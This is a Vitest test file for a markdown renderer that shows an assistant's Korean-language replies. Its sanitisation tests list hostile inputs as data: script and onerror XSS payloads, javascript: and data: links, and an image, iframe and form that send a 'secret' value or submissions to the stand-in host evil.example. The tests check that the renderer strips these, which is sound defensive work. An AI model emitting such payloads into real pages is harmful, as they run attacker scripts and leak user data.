import { describe, expect, it } from 'vitest'

import { renderMarkdown } from '@/utils/markdown'

function dom(html) {
  const div = document.createElement('div')
  div.innerHTML = html
  return div
}

describe('renderMarkdown', () => {
  it('renders the formatting Claude uses', () => {
    const html = renderMarkdown('**14일 무료 체험**\n\n- 기본: 월 5,000원\n- 기업: 월 12,000원')

    const root = dom(html)
    expect(root.querySelector('strong').textContent).toBe('14일 무료 체험')
    expect([...root.querySelectorAll('li')].map((li) => li.textContent)).toEqual([
      '기본: 월 5,000원',
      '기업: 월 12,000원',
    ])
  })

  it('keeps single line breaks (like the old pre-wrap display)', () => {
    expect(renderMarkdown('첫 줄\n둘째 줄')).toContain('<br>')
  })

  it('renders tables', () => {
    const root = dom(renderMarkdown('| 요금제 | 가격 |\n| --- | --- |\n| 기본 | 5,000원 |'))

    expect(root.querySelector('td').textContent).toBe('기본')
  })

  it.each([
    ['<script>alert(1)</script>안녕', 'script'],
    ['<img src=x onerror=alert(1)>', 'img'],
    ['![추적](https://evil.example/pixel.png?d=secret)', 'img'],
    ['<iframe src="https://evil.example"></iframe>', 'iframe'],
    ['<form action="https://evil.example"><input name=a></form>', 'form'],
    ['<style>body{display:none}</style>', 'style'],
  ])('strips dangerous or tracking content: %s', (input, tag) => {
    const root = dom(renderMarkdown(input))

    expect(root.querySelector(tag)).toBeNull()
    expect(root.innerHTML).not.toMatch(/onerror|evil\.example/)
  })

  it('removes event handlers and unsafe link schemes', () => {
    const html = renderMarkdown(
      '[클릭](javascript:alert(1)) <a href="data:text/html,x" onclick="x()">d</a> <b onmouseover="x()">b</b>',
    )

    expect(html).not.toMatch(/javascript:|data:|onclick|onmouseover/)
  })

  it('opens safe links in a new tab without referrer', () => {
    const link = dom(renderMarkdown('[홈페이지](https://example.com)')).querySelector('a')

    expect(link.getAttribute('href')).toBe('https://example.com')
    expect(link.getAttribute('target')).toBe('_blank')
    expect(link.getAttribute('rel')).toBe('noopener noreferrer nofollow')
  })

  it('allows mailto and tel links', () => {
    const root = dom(renderMarkdown('[메일](mailto:support@example.com) [전화](tel:0212345678)'))

    expect([...root.querySelectorAll('a')].map((a) => a.getAttribute('href'))).toEqual([
      'mailto:support@example.com',
      'tel:0212345678',
    ])
  })

  it('handles partial markdown while streaming', () => {
    expect(() => renderMarkdown('오케이캘린더는 **14일 무')).not.toThrow()
    expect(renderMarkdown('')).toBe('')
  })
})
